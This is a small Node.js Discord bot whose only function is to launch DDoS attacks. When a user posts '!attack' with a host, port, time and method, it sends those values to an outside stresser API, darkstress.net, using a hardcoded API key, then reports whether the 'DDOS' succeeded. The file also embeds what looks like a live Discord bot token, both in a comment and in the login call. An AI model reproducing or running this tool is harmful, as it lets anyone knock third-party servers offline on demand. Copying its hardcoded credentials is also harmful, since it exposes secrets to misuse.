const axios = require('axios').default;


const Discord = require("discord.js");
const { send } = require("express/lib/response");
const client = new Discord.Client({
    intents:[
        Discord.Intents.FLAGS.GUILDS,
        Discord.Intents.FLAGS.GUILD_MESSAGES
    ]
});

client.on("ready", ()=>{
  console.log("DHIT")
})

client.on('message',msg =>{
  if(msg.content.startsWith("!attack") ){
      const arr = msg.content.split(" ")
      console.log(arr)


    axios.get(`https://darkstress.net/api/execute?key=fd190cc7-ea09-4aaf-b840-cc44db545c4a&host=${arr[1]}&port=${arr[2]}&time=${arr[3]}&method=${arr[4]}&server=64076e8b-bf05-4cf3-95b8-8368b5d1479c`)
    .then(function (response) {
        // handle success
        console.log(response);
        if(response.data.error == false){
            msg.channel.send("DDOS COMPLETED SUCCESSFULLY.")
        }else if (response.data.error == true) {
            msg.channel.send(`DDOS FAILED: MSG = ${response.data.message} `)
        }
    })
    .catch(function (error) {
        // handle error
    
     
            msg.channel.send(`DDOS FAILED! MSG = ${error.response.data.message} `)
    

    })
    .then(function () {
        // always executed
    });

 
    
  }
})
// toke = OTcwNjM1NzQzNzI0NzI0Mjg0.G9o6zv.LoGCb5ALn9JKl797P-C74qZlo4mZk4Krccvahk
client.login("OTcwNjM1NzQzNzI0NzI0Mjg0.G9o6zv.LoGCb5ALn9JKl797P-C74qZlo4mZk4Krccvahk")
